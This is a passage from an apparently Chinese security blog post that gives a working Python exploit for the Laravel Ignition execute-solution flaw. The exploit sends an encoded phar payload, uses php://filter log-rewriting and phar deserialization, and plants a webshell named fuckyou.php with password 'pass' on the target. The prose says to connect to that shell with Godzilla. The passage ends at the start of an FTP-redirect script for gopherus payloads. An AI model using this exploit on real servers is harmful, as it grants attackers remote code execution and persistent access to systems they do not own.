D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filterlog</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">phar</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;phar://&#34;</span><span class="o">+</span><span class="n">path</span><span class="o">+</span><span class="s2">&#34;\storage</span><span class="se">\\</span><span class="s2">logs</span><span class="se">\\</span><span class="s2">laravel.log</span><span class="se">\\</span><span class="s2">test.txt&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pharl</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;phar://&#34;</span><span class="o">+</span><span class="n">path</span><span class="o">+</span><span class="s2">&#34;/storage/logs/laravel.log/test.txt&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">path</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(\#\d*\ (.*)(?:\/|</span><span class="se">\\</span><span class="s1">)vendor)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span><span class="o">=</span><span class="n">pattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  ██████ ▓█████  ▄████▄   ██▓███   ██▀███   ▒█████    ██████ 
</span></span></span><span class="line"><span class="cl"><span class="s1">▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ 
</span></span></span><span class="line"><span class="cl"><span class="s1">░ ▓██▄   ▒███   ▒▓█    ▄ ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   
</span></span></span><span class="line"><span class="cl"><span class="s1">  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒
</span></span></span><span class="line"><span class="cl"><span class="s1">▒██████▒▒░▒████▒▒ ▓███▀ ░▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒
</span></span></span><span class="line"><span class="cl"><span class="s1">▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
</span></span></span><span class="line"><span class="cl"><span class="s1">░ ░▒  ░ ░ ░ ░  ░  ░  ▒   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
</span></span></span><span class="line"><span class="cl"><span class="s1">░  ░  ░     ░   ░        ░░         ░░   ░ ░ ░ ░ ▒  ░  ░  ░  
</span></span></span><span class="line"><span class="cl"><span class="s1">      ░     ░  ░░ ░                  ░         ░ ░        ░  
</span></span></span><span class="line"><span class="cl"><span class="s1">                ░                                            
</span></span></span><span class="line"><span class="cl"><span class="s1"> 
</span></span></span><span class="line"><span class="cl"><span class="s1">	&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">url</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/_ignition/execute-solution&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="n">clearlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">clearlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">clearlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">clearlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">clearlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">AA</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">500</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="s2">&#34;:&#34;</span> <span class="ow">in</span> <span class="n">path</span><span class="p">(</span><span class="n">url</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;windows&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="n">sendpayloadwindows</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">500</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="n">filterlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span><span class="n">phar</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">path</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">500</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">						<span class="k">if</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/fuckyou.php&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">							<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]webshell地址:&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/fuckyou.php,密码:pass&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">						<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">							<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-]漏洞不存在&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="s2">&#34;:&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">path</span><span class="p">(</span><span class="n">url</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="n">sendpayloadlinux</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">500</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="n">filterlog</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span><span class="n">pharl</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">path</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">500</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">						<span class="k">if</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/fuckyou.php&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">							<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;webshell地址:&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/fuckyou.php,密码:pass&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">						<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">							<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-]漏洞不存在&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091316702.png"
        data-srcset="/images/202202091316702.png, /images/202202091316702.png 1.5x, /images/202202091316702.png 2x"
        data-sizes="auto"
        alt="/images/202202091316702.png"
        title="/images/202202091316702.png" /></p>
<p>根据路径密码使用哥斯拉连接木马</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091316166.png"
        data-srcset="/images/202202091316166.png, /images/202202091316166.png 1.5x, /images/202202091316166.png 2x"
        data-sizes="auto"
        alt="/images/202202091316166.png"
        title="/images/202202091316166.png" /></p>
<p><strong>FTP脚本</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="c1"># @Time    : 2021/1/13 6:56 下午</span>
</span></span><span class="line"><span class="cl"><span class="c1"># @Author  : tntaxin</span>
</span></span><span class="line"><span class="cl"><span class="c1"># @File    : ftp_redirect.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># @Software:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 对gopherus生成的payload进行一次urldecode</span>
